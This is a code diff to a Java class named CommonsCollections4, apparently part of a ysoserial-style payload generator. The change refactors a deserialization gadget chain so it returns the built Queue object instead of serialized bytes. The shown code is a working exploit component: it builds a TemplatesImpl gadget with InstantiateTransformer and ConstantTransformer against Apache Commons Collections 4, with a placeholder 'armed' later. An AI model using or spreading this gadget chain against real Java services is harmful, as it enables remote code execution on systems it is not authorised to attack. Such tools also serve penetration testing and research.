@@ -22,14 +22,14 @@ import java.util.Queue;
  */
 public class CommonsCollections4 implements ObjectPayload<Queue<Object>>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Queue<Object> getObject(PayloadType type, String... param) throws Exception {
         Object templates = Gadgets.createTemplatesImpl(type, param);
 
         ConstantTransformer constant = new ConstantTransformer(String.class);
 
         // mock method name until armed
         Class[]  paramTypes = new Class[]{String.class};
-        Object[] args       = new Object[]{"foo"};
+        Object[] args       = new Object[]{"su18"};
         InstantiateTransformer instantiate = new InstantiateTransformer(
                 paramTypes, args);
 
@@ -49,18 +49,6 @@ public class CommonsCollections4 implements ObjectPayload<Queue<Object>>{
         paramTypes[0] = Templates.class;
         args[0] = templates;
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(queue);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Queue<Object> getObject(String command) throws Exception {
-        return null;
+        return queue;
     }
 }
